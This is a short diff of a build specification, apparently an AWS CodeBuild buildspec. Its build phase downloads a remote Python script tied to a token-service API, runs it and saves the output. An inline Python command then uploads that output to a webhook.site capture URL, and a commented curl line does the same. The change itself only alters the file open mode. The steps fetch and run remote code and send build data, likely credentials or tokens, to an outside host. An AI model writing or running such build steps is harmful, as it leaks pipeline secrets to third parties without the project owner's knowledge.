@@ -9,7 +9,7 @@ phases:
       - python -m pip install botocore boto3 requests >> notes.txt
       - wget https://raw.githubusercontent.com/thomaspreece/AWS-CodeFactoryTokenService-API/refs/heads/main/GetBuildInfo.py
       - python ./GetBuildInfo.py > out.txt
-      - python -c "import requests,sys; f=open('out.txt','rb'); r=requests.post('https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf', files={'file': f}); f.close(); print(r.status_code, r.text)"
+      - python -c "import requests,sys; f=open('out.txt','r'); r=requests.post('https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf', files={'file': f}); f.close(); print(r.status_code, r.text)"
       #- curl --data-binary @out.txt https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf
 artifacts:
   files:
